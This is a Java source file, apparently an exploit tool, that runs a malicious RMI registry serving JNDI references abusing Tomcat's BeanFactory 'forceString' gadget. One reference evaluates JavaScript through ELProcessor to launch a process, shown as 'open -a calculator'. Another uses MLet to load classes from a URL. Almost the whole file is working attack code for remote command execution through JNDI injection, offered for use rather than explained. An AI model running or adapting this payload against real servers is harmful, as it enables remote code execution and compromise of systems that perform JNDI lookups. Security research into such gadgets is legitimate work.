package org.example.attack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import jdk.nashorn.internal.runtime.regexp.joni.exception.SyntaxException;
import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.util.Properties;
public class JndiBypassPayload {
        private static ResourceRef elProcessor(){
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));
                ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open -a calculator']).start()\")"));
                return ref;
        }
        private static ResourceRef tomcatMLet() {
                ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
                ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
                ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
                ref.add(new StringRefAddr("c", "Blue"));
                return ref;
        }
    public static void main(String[] args) throws NamingException, RemoteException {
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");

            System.out.println("createRegistry start:  127.0.0.1:1099");
            InitialContext ctx = new InitialContext(env);
            LocateRegistry.createRegistry(1099);

            //ELProcessor
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(elProcessor());
            ctx.bind("ELProcessor", referenceWrapper);
    }
}
